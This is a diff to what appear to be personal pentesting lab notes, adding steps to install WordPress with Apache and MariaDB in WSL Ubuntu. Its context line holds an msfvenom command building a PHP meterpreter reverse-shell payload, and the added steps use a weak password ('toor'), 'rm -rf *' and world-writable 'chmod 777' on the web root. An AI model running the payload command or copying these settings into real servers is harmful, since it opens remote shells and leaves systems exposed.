@@ -109,6 +109,40 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.174.128 lport=443 -f raw >
 
 
 
+////Now Wordpress set up in wsl ubuntu:
+sudo apt update && sudo apt upgrade -y
+sudo apt install net-tools mc php -y
+sudo apt install apache2 mariadb-server php php-zip php-mysql php-xml -y
+
+sudo service apache2 start
+sudo service mysql start
+sudo mysql_secure_installation
+
+sudo mysql -uroot -p
+CREATE USER 'sajib'@'localhost' IDENTIFIED BY 'toor';
+GRANT ALL PRIVILEGES ON wordpressdb.* TO 'sajib'@'localhost';
+CREATE DATABASE IF NOT EXISTS wordpressdb CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
+FLUSH PRIVILEGES;
+quit;
+
+///after coming to ubuntu we will go:
+cd /var/www/html
+sudo rm -rf *
+chmod -R 777 /var/www/html
+
+//Now we will download a zip from wordpress site
+extract it and copy the all internal files and folder to /var/www/html (to do this we basic cally go to file exproler in windows and find a linux logo and from whrer go to ubuntu and go to /var/www/html and.....now paste the content)!!!!
+
+now check the ip of ubuntu
+and serch it to the browser and configure the wordpress....
+here for me  (wordpressdb,sajib,toor,localhost)!!!
+
+
+
+
+
+
+
 
 
 
